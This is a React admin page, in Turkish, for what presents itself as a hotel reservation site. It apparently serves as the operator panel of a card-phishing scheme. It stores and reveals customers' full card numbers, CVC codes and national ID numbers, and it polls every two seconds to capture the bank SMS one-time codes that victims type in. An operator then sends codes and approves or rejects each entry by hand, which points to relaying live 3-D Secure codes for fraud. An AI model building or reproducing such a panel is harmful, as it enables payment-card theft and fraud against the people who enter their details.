'use client';

import { useState, useEffect, useCallback } from 'react';
import { CheckCircle, XCircle, Clock, RefreshCw, Trash2, Search, Eye, EyeOff, ThumbsUp, ThumbsDown } from 'lucide-react';

interface Reservation {
  id: string;
  timestamp: string;
  roomId: string | null;
  roomName: string | null;
  totalPrice: string | null;
  checkIn: string | null;
  checkOut: string | null;
  adults: string | null;
  children: string | null;
  cardHolder: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvc: string;
  cardType: string;
  email: string;
  phone: string;
  smsCode: string;
  smsVerified: boolean;
  status: string;
  adminAction: string | null;
  adminActionAt: string | null;
  tcNo?: string;
  address?: string;
  country?: string;
  city?: string;
  requests?: string;
  guests?: {
    adults: number;
    children: number;
  };
}

const STATUS: Record<string, { label: string; dot: string; text: string }> = {
  confirmed:     { label: 'Onaylandı',        dot: 'bg-emerald-400', text: 'text-emerald-400' },
  card_submitted:{ label: '🆕 Kart Alındı',  dot: 'bg-cyan-400',    text: 'text-cyan-400'   },
  awaiting_sms:  { label: '⏳ SMS Bekleniyor',dot: 'bg-blue-400',    text: 'text-blue-400'   },
  sms_screen:    { label: 'SMS Ekranı',       dot: 'bg-indigo-400',  text: 'text-indigo-400' },
  sms_entered:   { label: '🔴 SMS Girildi',   dot: 'bg-amber-400',   text: 'text-amber-400'  },
  sms_failed:    { label: 'Kod Hatalı',       dot: 'bg-red-400',     text: 'text-red-400'    },
  rejected:      { label: 'Reddedildi',       dot: 'bg-red-500',     text: 'text-red-500'    },
  pending:       { label: 'Beklemede',        dot: 'bg-gray-400',    text: 'text-gray-400'   },
};

function Dot({ status }: { status: string }) {
  const s = STATUS[status] ?? STATUS.pending;
  return (
    <span className="flex items-center gap-1.5 text-xs font-bold" style={{color: s.text.replace('text-','')}}>
      <span className={`inline-block w-2 h-2 rounded-full ${s.dot} ${status === 'sms_entered' ? 'animate-ping' : ''}`}/>
      <span className={s.text}>{s.label}</span>
    </span>
  );
}

export default function AdminReservations() {
  const [reservations, setReservations] = useState<Reservation[]>([]);
  const [selected, setSelected] = useState<Reservation | null>(null);
  const [search, setSearch] = useState('');
  const [filter, setFilter] = useState('all');
  const [showCardDetails, setShowCardDetails] = useState<Record<string, boolean>>({});
  const [actionLoading, setActionLoading] = useState<string | null>(null);

  const load = useCallback(async () => {
    try {
      const res = await fetch('/api/reservations');
      const data: Reservation[] = await res.json();
      const sorted = [...data].sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
      setReservations(sorted);
      if (selected) {
        const fresh = sorted.find(r => r.id === selected.id);
        if (fresh) setSelected(fresh);
      }
    } catch { /* ignore */ }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    load();
    const iv = setInterval(load, 2000); // 2s refresh to catch live SMS entries
    return () => clearInterval(iv);
  }, [load]);

  const handleAction = async (id: string, action: 'approve' | 'reject' | 'send_sms') => {
    setActionLoading(id + action);
    try {
      await fetch('/api/reservations', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id,
          adminAction: action,
          adminActionAt: new Date().toISOString(),
          status: action === 'approve' ? 'confirmed' : action === 'reject' ? 'rejected' : undefined,
        }),
      });
    } catch { /* silent */ }
    setTimeout(() => {
      setActionLoading(null);
      load();
    }, 600);
  };

  const deleteOne = async (id: string) => {
    try {
      await fetch(`/api/reservations?id=${id}`, { method: 'DELETE' });
    } catch { /* silent */ }
    setReservations(prev => prev.filter(r => r.id !== id));
    if (selected?.id === id) setSelected(null);
  };

  const clearAll = async () => {
    if (!confirm('Tüm rezervasyonları silmek istediğinizden emin misiniz?')) return;
    try {
      await fetch('/api/reservations', { method: 'DELETE' });
    } catch { /* silent */ }
    setReservations([]);
    setSelected(null);
  };

  const toggleCard = (id: string) => setShowCardDetails(p => ({...p, [id]: !p[id]}));

  const filtered = reservations.filter(r => {
    const q = search.toLowerCase();
    const matchSearch = !q ||
      r.cardHolder?.toLowerCase().includes(q) ||
      r.email?.toLowerCase().includes(q) ||
      r.phone?.includes(q) ||
      r.roomName?.toLowerCase().includes(q) ||
      r.id?.toLowerCase().includes(q);
    const matchFilter = filter === 'all' || r.status === filter;
    return matchSearch && matchFilter;
  });

  const counts = {
    all: reservations.length,
    sms_entered: reservations.filter(r => r.status === 'sms_entered').length,
    confirmed: reservations.filter(r => r.status === 'confirmed').length,
    rejected: reservations.filter(r => r.status === 'rejected' || r.status === 'sms_failed').length,
  };

  return (
    <div className="p-8 w-full text-white">
      <div className="flex items-center justify-between mb-8 max-w-[1400px] mx-auto">
        <div>
          <h1 className="text-2xl font-black text-white tracking-widest uppercase flex items-center gap-3">
            <div className="w-8 h-8 rounded-lg bg-white/10 flex items-center justify-center border border-white/20">
              <RefreshCw size={16} className={`text-white/70 ${selected ? '' : 'animate-spin-slow'}`}/>
            </div>
            Rezervasyon Kontrol
          </h1>
          <p className="text-sm text-[#bd9f67] font-semibold mt-1 tracking-wider">CANLI AKIŞ</p>
        </div>
        <div className="flex gap-2">
          <button onClick={load} className="flex items-center gap-2 bg-white/5 hover:bg-white/10 border border-white/10 px-3 py-2 rounded-lg text-sm transition-colors">
            <RefreshCw size={13}/> Yenile
          </button>
          {reservations.length > 0 && (
            <button onClick={clearAll} className="flex items-center gap-2 bg-red-500/10 hover:bg-red-500/20 border border-red-500/20 text-red-400 px-3 py-2 rounded-lg text-sm transition-colors">
              <Trash2 size={13}/> Temizle
            </button>
          )}
        </div>
      </div>

      <div className="p-6 max-w-[1400px] mx-auto">
        {/* Stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
          {[
            { key:'all',        label:'Toplam',          val: counts.all,         color:'border-white/10'         },
            { key:'sms_entered',label:'SMS Girildi 🔴',  val: counts.sms_entered, color:'border-amber-500/50'     },
            { key:'confirmed',  label:'Onaylandı',       val: counts.confirmed,   color:'border-emerald-500/40'   },
            { key:'rejected',   label:'Reddedildi',      val: counts.rejected,    color:'border-red-500/40'       },
          ].map(s => (
            <button key={s.key} onClick={() => setFilter(s.key)}
              className={`rounded-2xl p-5 text-left border-2 bg-white/3 hover:bg-white/5 transition-all ${filter === s.key ? s.color : 'border-white/5'}`}>
              <div className="text-3xl font-black mb-1">{s.val}</div>
              <div className="text-xs text-white/50">{s.label}</div>
            </button>
          ))}
        </div>

        {/* Live alert for pending SMS */}
        {counts.sms_entered > 0 && (
          <div className="mb-4 flex items-center gap-3 bg-amber-500/10 border border-amber-500/30 rounded-xl px-5 py-3 animate-pulse">
            <span className="w-2.5 h-2.5 rounded-full bg-amber-400 animate-ping"/>
            <span className="text-amber-300 font-bold text-sm">{counts.sms_entered} rezervasyon admin onayı bekliyor!</span>
          </div>
        )}

        {/* Search */}
        <div className="relative mb-4">
          <Search size={16} className="absolute left-4 top-1/2 -translate-y-1/2 text-white/30"/>
          <input
            type="text" placeholder="Misafir adı, e-posta, telefon, oda veya rezervasyon no ara..."
            value={search} onChange={e => setSearch(e.target.value)}
            className="w-full bg-white/5 border border-white/10 rounded-xl pl-10 pr-4 py-3 text-sm placeholder-white/20 focus:border-[#bd9f67] outline-none"
          />
        </div>

        <div className="flex gap-6 items-start">
          {/* Table */}
          <div className="flex-1 min-w-0 rounded-2xl border border-white/10 overflow-hidden">
            {filtered.length === 0 ? (
              <div className="py-20 text-center text-white/20">
                <Clock size={36} className="mx-auto mb-3 opacity-30"/>
                <p>Henüz rezervasyon yok</p>
                <p className="text-xs mt-1">Ödeme sayfasından yapılan rezervasyonlar burada görünür</p>
              </div>
            ) : (
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-white/5 text-white/40 text-[11px] uppercase tracking-widest border-b border-white/10">
                    <th className="text-left px-4 py-3">Misafir</th>
                    <th className="text-left px-4 py-3">Oda</th>
                    <th className="text-left px-4 py-3">Tarih</th>
                    <th className="text-left px-4 py-3">SMS Kodu</th>
                    <th className="text-left px-4 py-3">Tutar</th>
                    <th className="text-left px-4 py-3">Durum</th>
                    <th className="px-4 py-3 text-center">İşlem</th>
                  </tr>
                </thead>
                <tbody>
                  {filtered.map((r) => (
                    <tr
                      key={r.id}
                      className={`border-b border-white/5 cursor-pointer transition-colors ${selected?.id === r.id ? 'bg-[#bd9f67]/8' : 'hover:bg-white/4'} ${r.status === 'sms_entered' ? 'bg-amber-500/5' : ''}`}
                      onClick={() => setSelected(selected?.id === r.id ? null : r)}
                    >
                      <td className="px-4 py-3">
                        <div className="font-semibold">{r.cardHolder || '—'}</div>
                        <div className="text-white/40 text-xs">{r.email}</div>
                        <div className="text-white/30 text-xs">{r.phone}</div>
                      </td>
                      <td className="px-4 py-3 text-white/70 max-w-[160px]">
                        <div className="truncate">{r.roomName}</div>
                        <div className="text-white/30 text-xs">{r.id}</div>
                      </td>
                      <td className="px-4 py-3">
                        <div className="text-white/80">{r.checkIn}</div>
                        <div className="text-white/40 text-xs">→ {r.checkOut}</div>
                      </td>
                      <td className="px-4 py-3">
                        {r.smsCode
                          ? <span className="font-mono font-black text-emerald-400 text-base tracking-widest">{r.smsCode}</span>
                          : <span className="text-white/20 text-xs">Bekleniyor...</span>
                        }
                      </td>
                      <td className="px-4 py-3">
                        <div className="font-bold text-[#bd9f67]">{Number(r.totalPrice).toLocaleString('tr-TR')} TL</div>
                      </td>
                      <td className="px-4 py-3"><Dot status={r.status}/></td>
                      <td className="px-4 py-3">
                        {/* Stage 1: Card received — admin sends SMS manually */}
                        {(r.status === 'awaiting_sms' || r.status === 'card_submitted') && (
                          <div className="text-center">
                            <span className="text-xs font-bold text-cyan-400 bg-cyan-400/10 border border-cyan-400/20 px-2.5 py-1 rounded-lg">
                              📲 SMS Gönder
                            </span>
                          </div>
                        )}
                        {/* Stage 2: Admin approves or rejects after SMS */}
                        {(r.status === 'sms_entered') && (
                          <div className="flex gap-1.5 justify-center">
                            <button
                              onClick={e => { e.stopPropagation(); handleAction(r.id, 'approve'); }}
                              disabled={!!actionLoading}
                              className="flex items-center gap-1 bg-emerald-500/20 hover:bg-emerald-500/40 text-emerald-400 border border-emerald-500/30 px-3 py-1.5 rounded-lg text-xs font-bold transition-colors disabled:opacity-50"
                            >
                              {actionLoading === r.id+'approve' ? <div className="w-3 h-3 border border-white border-t-transparent rounded-full animate-spin"/> : <ThumbsUp size={12}/>} Onayla
                            </button>
                            <button
                              onClick={e => { e.stopPropagation(); handleAction(r.id, 'reject'); }}
                              disabled={!!actionLoading}
                              className="flex items-center gap-1 bg-red-500/20 hover:bg-red-500/40 text-red-400 border border-red-500/30 px-3 py-1.5 rounded-lg text-xs font-bold transition-colors disabled:opacity-50"
                            >
                              {actionLoading === r.id+'reject' ? <div className="w-3 h-3 border border-white border-t-transparent rounded-full animate-spin"/> : <ThumbsDown size={12}/>} Reddet
                            </button>
                          </div>
                        )}
                        {(r.status === 'confirmed') && (
                          <div className="flex justify-center">
                            <span className="flex items-center gap-1 text-emerald-400 text-xs font-bold"><CheckCircle size={12}/> Onaylandı</span>
                          </div>
                        )}
                        {(r.status === 'rejected' || r.status === 'sms_failed') && (
                          <div className="flex justify-center">
                            <span className="flex items-center gap-1 text-red-400 text-xs font-bold"><XCircle size={12}/> Reddedildi</span>
                          </div>
                        )}
                        <button onClick={e => { e.stopPropagation(); deleteOne(r.id); }} className="flex justify-center w-full mt-1 text-white/20 hover:text-red-400 transition-colors">
                          <Trash2 size={13}/>
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </div>

          {/* Detail Drawer */}
          {selected && (
            <div className="w-[320px] shrink-0 rounded-2xl border border-white/10 overflow-hidden" style={{background:'#142131'}}>
              {/* Card Visual */}
              <div className="p-5" style={{background:'linear-gradient(135deg,#0f2027 0%,#203a43 60%,#2c5364 100%)'}}>
                <div className="flex justify-between items-start mb-4">
                  <div>
                    <p className="text-[10px] uppercase tracking-widest text-white/40">Müşteri Kartı</p>
                    <p className="text-[#bd9f67] font-bold text-sm mt-0.5">{selected.cardType}</p>
                  </div>
                  <button onClick={() => toggleCard(selected.id)} className="text-white/40 hover:text-white transition-colors flex items-center gap-1 text-xs">
                    {showCardDetails[selected.id] ? <EyeOff size={13}/> : <Eye size={13}/>}
                    {showCardDetails[selected.id] ? 'Gizle' : 'Göster'}
                  </button>
                </div>

                {/* Card Number */}
                <div className="font-mono font-black text-white text-lg tracking-[0.2em] mb-3">
                  {showCardDetails[selected.id]
                    ? selected.cardNumber.replace(/(\d{4})/g,'$1 ').trim()
                    : `**** **** **** ${selected.cardNumber.slice(-4)}`
                  }
                </div>
                <div className="flex justify-between text-xs text-white/60">
                  <div>
                    <div className="text-white/30 mb-0.5 text-[9px] uppercase tracking-widest">Kart Sahibi</div>
                    <div className="font-bold text-white">{selected.cardHolder}</div>
                  </div>
                  <div className="text-right">
                    <div className="text-white/30 mb-0.5 text-[9px] uppercase tracking-widest">Son Kullanım</div>
                    <div className="font-bold font-mono text-white">{selected.cardExpiry}</div>
                  </div>
                  {showCardDetails[selected.id] && (
                    <div className="text-right">
                      <div className="text-white/30 mb-0.5 text-[9px] uppercase tracking-widest">CVC</div>
                      <div className="font-bold font-mono text-white">{selected.cardCvc}</div>
                    </div>
                  )}
                </div>
              </div>

              {/* Details */}
              <div className="p-4 space-y-2 text-sm overflow-y-auto max-h-[400px]">
                <Row label="Rezervasyon No" val={selected.id} mono/>
                <Row label="Durum" val={STATUS[selected.status]?.label ?? selected.status}/>
                <Row label="Tarih" val={new Date(selected.timestamp).toLocaleString('tr-TR')}/>
                <hr className="border-white/10 my-2"/>
                <Row label="Oda" val={selected.roomName ?? '—'}/>
                <Row label="Giriş / Çıkış" val={`${selected.checkIn} → ${selected.checkOut}`}/>
                <Row label="Toplam" val={`${Number(selected.totalPrice).toLocaleString('tr-TR')} TL`} accent/>
                <hr className="border-white/10 my-2"/>
                
                {/* Rich Contact Info */}
                <div className="text-[10px] uppercase tracking-widest text-[#bd9f67] mb-1 font-bold">Müşteri Detayları</div>
                <Row label="E-posta" val={selected.email}/>
                <Row label="Telefon" val={selected.phone}/>
                {selected.tcNo && <Row label="TC Kimlik" val={selected.tcNo} mono/>}
                {selected.address && <Row label="Adres" val={selected.address}/>}
                {selected.country && <Row label="Ülke/Şehir" val={`${selected.country} - ${selected.city}`}/>}
                
                {selected.requests && (
                  <div className="mt-2 bg-white/5 p-2 rounded border border-white/10">
                    <span className="text-[10px] text-white/40 block mb-1 uppercase tracking-widest">Özel Ricalar</span>
                    <span className="text-xs text-white/80">{selected.requests}</span>
                  </div>
                )}
                <hr className="border-white/10 my-2"/>

                {/* OTP Status */}
                <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-3 mt-2">
                  <p className="text-[10px] text-amber-400/70 uppercase tracking-widest mb-1">SMS Kodu</p>
                  <p className="font-mono font-black text-2xl text-amber-400 tracking-[0.4em]">
                    {selected.smsCode || '——————'}
                  </p>
                </div>
              </div>

              {/* Stage 1: Card received — admin sends SMS manually */}
              {(selected.status === 'awaiting_sms' || selected.status === 'card_submitted') && (
                <div className="px-4 pb-4">
                  <div className="bg-cyan-500/10 border border-cyan-500/20 rounded-xl px-4 py-3 text-xs text-cyan-300 font-bold">
                    📲 Kart bilgileri alındı!<br/>
                    <span className="font-normal text-cyan-400/70 mt-1 block">Müşteriye SMS kodunu gönderin. SMS girilince 2. bildirim gelecek.</span>
                  </div>
                </div>
              )}
              {/* Stage 2: Admin approves or rejects after SMS */}
              {(selected.status === 'sms_entered') && (
                <div className="px-4 pb-4 flex gap-2">
                  <button
                    onClick={() => handleAction(selected.id, 'approve')} disabled={!!actionLoading}
                    className="flex-1 flex items-center justify-center gap-2 bg-emerald-500/20 hover:bg-emerald-500/30 border border-emerald-500/40 text-emerald-400 py-3 rounded-xl font-bold text-sm transition-colors disabled:opacity-50"
                  >
                    <ThumbsUp size={16}/> Onayla
                  </button>
                  <button
                    onClick={() => handleAction(selected.id, 'reject')} disabled={!!actionLoading}
                    className="flex-1 flex items-center justify-center gap-2 bg-red-500/20 hover:bg-red-500/30 border border-red-500/40 text-red-400 py-3 rounded-xl font-bold text-sm transition-colors disabled:opacity-50"
                  >
                    <ThumbsDown size={16}/> Reddet
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function Row({ label, val, mono, accent }: { label: string; val: string; mono?: boolean; accent?: boolean }) {
  return (
    <div className="flex justify-between gap-2 text-xs">
      <span className="text-white/30 shrink-0">{label}</span>
      <span className={`text-right font-medium truncate max-w-[180px] ${mono ? 'font-mono text-white/80' : accent ? 'text-[#bd9f67] font-bold' : 'text-white/80'}`}>{val}</span>
    </div>
  );
}
